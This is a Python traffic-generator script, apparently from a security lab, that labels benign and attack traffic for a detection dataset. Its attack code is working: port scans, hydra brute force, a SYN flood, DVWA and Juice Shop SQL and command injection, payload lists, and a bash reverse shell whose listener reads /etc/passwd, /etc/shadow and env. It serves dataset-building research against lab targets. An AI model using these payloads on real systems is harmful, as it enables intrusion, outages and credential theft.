#!/usr/bin/env python3
"""
Per-student toolbox. Runs in the SAME network namespace as the student's
desktop (network_mode: service:<s>-desktop), so every request it makes is
sourced from the desktop IP and recorded by that student's capture sidecar.

The student drives it from their desktop by writing a word to /control/phase:
    normal   -> generate benign browsing traffic to the student's static sites
    attack   -> network attacks on the static sites (scan / brute / flood)
    exploit  -> REAL exploits on the vulnerable apps: SQL injection, command
                injection, and a reverse-shell + data-exfiltration stage
    idle     -> do nothing (default)

Ground truth is appended to /logs/events.csv with the attack/exploit label AND
the site (organization) label, so flows can be merged per app later.

Sites come from /control/sites.json (written by generate_compose.py):
    [{"id","name","sector","ip","stack","type","port"}, ...]
type is "static" | "dvwa" | "juiceshop".
"""
import csv
import http.cookiejar
import json
import os
import random
import re
import socket
import subprocess
import threading
import time
import urllib.error
import urllib.parse
import urllib.request
from datetime import datetime, timezone

STUDENT = os.environ.get("STUDENT", "s000")
SRC_IP = os.environ.get("DESKTOP_IP", "0.0.0.0")   # reverse-shell callback host
SEED = int(os.environ.get("SEED", "42"))
SHELL_PORT = int(os.environ.get("SHELL_PORT", "4444"))

CONTROL = "/control/phase"
SITES_JSON = "/control/sites.json"
LOG = "/logs/events.csv"
USERS = "/opt/lists/users.txt"
PASSWORDS = "/opt/lists/passwords.txt"
DIRS = "/opt/lists/dirs.txt"

_lock = threading.Lock()


def now():
    return datetime.now(timezone.utc).isoformat(timespec="milliseconds")


def log(site, label, phase, t0, t1, code, outcome):
    # outcome: benign | attack | attempt | success
    #   attack  = scan/brute/flood (network attack, no compromise notion)
    #   attempt = exploit tried but target not compromised (e.g. static site)
    #   success = exploit compromised the target (e.g. DVWA)
    with _lock:
        new = not os.path.exists(LOG)
        os.makedirs(os.path.dirname(LOG), exist_ok=True)
        with open(LOG, "a", newline="") as f:
            w = csv.writer(f)
            if new:
                w.writerow(["student", "phase", "label", "outcome", "site_id",
                            "site_name", "sector", "src_ip", "dst_ip",
                            "start_utc", "end_utc", "exit_code"])
            w.writerow([STUDENT, phase, label, outcome, site["id"], site["name"],
                        site["sector"], SRC_IP, site["ip"], t0, t1, code])


def run(cmd, timeout=360):
    try:
        r = subprocess.run(cmd, stdout=subprocess.DEVNULL,
                           stderr=subprocess.DEVNULL, timeout=timeout)
        return r.returncode
    except subprocess.TimeoutExpired:
        return -1
    except FileNotFoundError:
        return -2


def load_sites():
    try:
        with open(SITES_JSON) as f:
            return json.load(f)
    except (OSError, ValueError):
        return []


def read_phase():
    try:
        with open(CONTROL) as f:
            return f.read().strip().lower()
    except OSError:
        return "idle"


def set_phase(value):
    try:
        with open(CONTROL, "w") as f:
            f.write(value + "\n")
    except OSError:
        pass


# ---------------------------------------------------------------- normal ----
_PATHS = ["/", "/about.html", "/contact.html", "/services.html", "/news.html",
          "/login", "/robots.txt", "/assets/style.css", "/assets/logo.svg"]


def normal_burst(sites, rnd):
    statics = [s for s in sites if s.get("type", "static") == "static"] or sites
    t0 = now()
    deadline = time.time() + rnd.uniform(25, 60)
    while time.time() < deadline and read_phase() == "normal":
        site = rnd.choice(statics)
        base = f"http://{site['ip']}:{site.get('port', 80)}"
        for path in [rnd.choice(_PATHS), "/assets/style.css", "/assets/logo.svg",
                     f"/article-{rnd.randint(1, 8)}.html"]:
            run(["curl", "-s", "-o", "/dev/null", "--max-time", "8",
                 "-A", "Mozilla/5.0 (FL-Lab normal user)", base + path], timeout=10)
        time.sleep(rnd.uniform(0.5, 3.0))
    for site in statics:
        log(site, "benign", "normal", t0, now(), 0, "benign")


# ---------------------------------------------------------- network attacks -
def attack_cmds(site):
    ip, port = site["ip"], site.get("port", 80)
    if site.get("stack") == "apache":
        login_path, fail = "/login.html", "login-form"
    else:
        login_path, fail = "/login", "Invalid"
    base = f"http://{ip}:{port}"
    return {
        "portscan":      (["nmap", "-sS", "-T3", "-p", "1-10000", ip], 300),
        # Web-layer scan via nmap HTTP NSE scripts (enumeration + probes).
        # Uses the already-installed nmap, so no extra toolbox dependency.
        "web_scan":      (["nmap", "-Pn", "-p", str(port), "--script",
                           "http-enum,http-headers,http-title,http-methods,"
                           "http-sql-injection", ip], 300),
        "dir_bruteforce":(["dirb", f"{base}/", DIRS, "-S", "-r"], 180),
        "login_bruteforce":(["hydra", "-s", str(port), "-L", USERS, "-P",
                             PASSWORDS, "-t", "4", ip, "http-post-form",
                             f"{login_path}:username=^USER^&password=^PASS^:{fail}"], 240),
        # shorter, lower-rate flood so it doesn't swamp the flow dataset
        # (a flood still produces far more flows than other attacks)
        "syn_flood":     (["timeout", "20", "hping3", "-S", "-p", str(port),
                           "-i", "u6000", ip], 35),
    }


def attack_phase(sites, rnd):
    statics = [s for s in sites if s.get("type", "static") == "static"] or sites
    targets = rnd.sample(statics, k=rnd.randint(1, min(3, len(statics))))
    print(f"{STUDENT}: attacking {[t['id'] for t in targets]}", flush=True)
    for site in targets:
        cmds = attack_cmds(site)
        for idx, name in enumerate(rnd.sample(sorted(cmds), k=rnd.randint(2, 4))):
            if idx:
                time.sleep(rnd.uniform(10, 16))   # gap so windows don't overlap
            cmd, tmo = cmds[name]
            t0 = now()
            code = run(cmd, timeout=tmo + 30)
            log(site, name, "attack", t0, now(), code, "attack")
            if read_phase() != "attack":
                return


# ------------------------------------------------------------ HTTP helpers --
def opener():
    cj = http.cookiejar.CookieJar()
    return urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj)), cj


def http_get(op, url, timeout=12):
    req = urllib.request.Request(url, headers={"User-Agent": "fl-lab"})
    return op.open(req, timeout=timeout).read().decode("utf-8", "ignore")


def http_post(op, url, data, timeout=12, json_body=False):
    if json_body:
        body = json.dumps(data).encode()
        headers = {"Content-Type": "application/json", "User-Agent": "fl-lab"}
    else:
        body = urllib.parse.urlencode(data).encode()
        headers = {"User-Agent": "fl-lab"}
    req = urllib.request.Request(url, data=body, headers=headers)
    return op.open(req, timeout=timeout).read().decode("utf-8", "ignore")


# ------------------------------------------------------ exploits: DVWA -------
_TOKEN_RE = re.compile(r"user_token['\"]\s*value=['\"]([0-9a-f]+)")


def _dvwa_token(op, url):
    try:
        m = _TOKEN_RE.search(http_get(op, url))
        return m.group(1) if m else ""
    except Exception:
        return ""


def _shell_listener(result, dwell=12):
    """Listen for the reverse shell, drive a few exfil commands, record it."""
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        srv.bind(("0.0.0.0", SHELL_PORT))
        srv.listen(1)
        srv.settimeout(45)
        conn, addr = srv.accept()
    except OSError:
        srv.close()
        return
    result["t0"] = now()
    result["victim"] = addr[0]
    conn.settimeout(4)
    for cmd in [b"id\n", b"uname -a\n", b"cat /etc/passwd\n",
                b"cat /etc/shadow 2>/dev/null\n", b"ls -la / \n", b"env\n"]:
        try:
            conn.sendall(cmd)
            time.sleep(1.5)
            conn.recv(8192)                 # pull output back = exfil traffic
        except OSError:
            break
    time.sleep(dwell)
    try:
        conn.sendall(b"exit\n")
        conn.close()
    except OSError:
        pass
    srv.close()
    result["t1"] = now()


def exploit_dvwa(site, rnd):
    ip, port = site["ip"], site.get("port", 80)
    base = f"http://{ip}:{port}"
    op, cj = opener()
    # 1) initialise DB (idempotent) then log in with default creds
    try:
        tok = _dvwa_token(op, base + "/setup.php")
        http_post(op, base + "/setup.php",
                  {"create_db": "Create / Reset Database", "user_token": tok})
    except Exception:
        pass
    try:
        tok = _dvwa_token(op, base + "/login.php")
        t0 = now()
        http_post(op, base + "/login.php",
                  {"username": "admin", "password": "password",
                   "Login": "Login", "user_token": tok})
        log(site, "login_success", "exploit", t0, now(), 0, "success")
    except Exception:
        log(site, "login_success", "exploit", now(), now(), -2, "attempt")
        return
    # force security level low via cookie
    cj.set_cookie(http.cookiejar.Cookie(
        0, "security", "low", None, False, ip, False, False, "/", True,
        False, None, True, None, None, {}))

    # 2) SQL injection (dumps all users)
    time.sleep(5)                                  # separate windows
    t0 = now()
    try:
        payload = urllib.parse.quote("1' OR '1'='1")
        http_get(op, f"{base}/vulnerabilities/sqli/?id={payload}&Submit=Submit")
        code = 0
    except Exception:
        code = -2
    log(site, "sqli", "exploit", t0, now(), code, "success" if code == 0 else "attempt")

    # 3) command injection (benign proof: read /etc/passwd)
    time.sleep(5)
    t0 = now()
    try:
        tok = _dvwa_token(op, base + "/vulnerabilities/exec/")
        http_post(op, base + "/vulnerabilities/exec/",
                  {"ip": "127.0.0.1; cat /etc/passwd", "Submit": "Submit",
                   "user_token": tok})
        code = 0
    except Exception:
        code = -2
    log(site, "cmd_injection", "exploit", t0, now(), code,
        "success" if code == 0 else "attempt")

    # 4) reverse shell + exfil (post-exploitation)
    time.sleep(5)
    result = {}
    lst = threading.Thread(target=_shell_listener, args=(result,), daemon=True)
    lst.start()
    time.sleep(1)
    rs = ("127.0.0.1; bash -c 'bash -i >& /dev/tcp/%s/%d 0>&1'"
          % (SRC_IP, SHELL_PORT))
    try:
        tok = _dvwa_token(op, base + "/vulnerabilities/exec/")
        # the shell call blocks the request; fire it with a short timeout
        http_post(op, base + "/vulnerabilities/exec/",
                  {"ip": rs, "Submit": "Submit", "user_token": tok}, timeout=8)
    except Exception:
        pass
    lst.join(timeout=70)
    if result.get("t0"):
        log(site, "reverse_shell", "exploit",
            result["t0"], result.get("t1", now()), 0, "success")
    else:
        log(site, "reverse_shell", "exploit", now(), now(), -1, "attempt")


# ------------------------------------------------- exploits: Juice Shop ------
def exploit_juiceshop(site, rnd):
    ip, port = site["ip"], site.get("port", 80)
    base = f"http://{ip}:{port}"
    op, _ = opener()
    # SQL injection login bypass -> returns an auth token on success
    t0 = now()
    try:
        http_post(op, base + "/rest/user/login",
                  {"email": "' OR 1=1--", "password": "x"}, json_body=True)
        code = 0
    except urllib.error.HTTPError:
        code = 0                     # 401 still means the injection was attempted
    except Exception:
        code = -2
    log(site, "sqli", "exploit", t0, now(), code, "success" if code == 0 else "attempt")
    # product search union-based injection (error/union traffic)
    t0 = now()
    try:
        q = urllib.parse.quote("qwert'))--")
        http_get(op, f"{base}/rest/products/search?q={q}")
        code = 0
    except Exception:
        code = -2
    log(site, "sqli", "exploit", t0, now(), code, "success" if code == 0 else "attempt")


# ------------------------------------ exploit ATTEMPTS on normal sites ------
# A real attacker sprays web-exploit payloads at EVERY site, not just the
# vulnerable one. Against the static company sites these never compromise
# anything (outcome="attempt"), but the malicious request traffic is real and
# must be labeled -- and it gives every organization exploit-class samples.
_ATTEMPT_PAYLOADS = {
    "sqli": ["/?id=1%27%20OR%20%271%27=%271",
             "/?q=1%27%20UNION%20SELECT%20NULL,NULL--",
             "/login?username=admin%27--&password=x"],
    "cmd_injection": ["/?cmd=;id", "/?host=127.0.0.1;cat%20/etc/passwd",
                      "/?ping=127.0.0.1|whoami"],
    "path_traversal": ["/?file=../../../../etc/passwd",
                       "/..%2f..%2f..%2f..%2fetc%2fpasswd",
                       "/?page=....//....//etc/passwd"],
    "xss": ["/?q=%3Cscript%3Ealert(1)%3C/script%3E",
            "/search?q=%3Cimg%20src=x%20onerror=alert(1)%3E"],
}


def web_exploit_attempts(site, rnd):
    base = f"http://{site['ip']}:{site.get('port', 80)}"
    op, _ = opener()
    for idx, name in enumerate(rnd.sample(sorted(_ATTEMPT_PAYLOADS), k=rnd.randint(2, 4))):
        if idx:
            time.sleep(rnd.uniform(6, 10))         # separate windows
        t0 = now()
        for path in _ATTEMPT_PAYLOADS[name]:
            for _ in range(rnd.randint(2, 4)):
                try:
                    http_get(op, base + path, timeout=6)
                except Exception:
                    pass
        log(site, name, "exploit", t0, now(), 0, "attempt")
        if read_phase() != "exploit":
            return


def exploit_phase(sites, rnd):
    vulns = [s for s in sites if s.get("type", "static") != "static"]
    statics = [s for s in sites if s.get("type", "static") == "static"]
    print(f"{STUDENT}: exploiting vuln={[v['id'] for v in vulns]} "
          f"attempts={[s['id'] for s in statics]}", flush=True)
    # real, succeeding exploits against the vulnerable apps
    for site in vulns:
        kind = site.get("type")
        if kind == "dvwa":
            exploit_dvwa(site, rnd)
        elif kind == "juiceshop":
            exploit_juiceshop(site, rnd)
        if read_phase() != "exploit":
            return
    # failed exploit attempts against every static company site
    for site in statics:
        web_exploit_attempts(site, rnd)
        if read_phase() != "exploit":
            return


# ------------------------------------------------------------------ main ----
def main():
    rnd = random.Random(SEED * 7919 + sum(ord(c) for c in STUDENT))
    print(f"{STUDENT}: toolbox up, src={SRC_IP}", flush=True)
    while True:
        sites = load_sites()
        phase = read_phase()
        if not sites:
            time.sleep(3)
            continue
        if phase == "normal":
            normal_burst(sites, rnd)
        elif phase == "attack":
            attack_phase(sites, rnd)
            set_phase("idle")
        elif phase == "exploit":
            exploit_phase(sites, rnd)
            set_phase("idle")
        else:
            time.sleep(2)


if __name__ == "__main__":
    main()
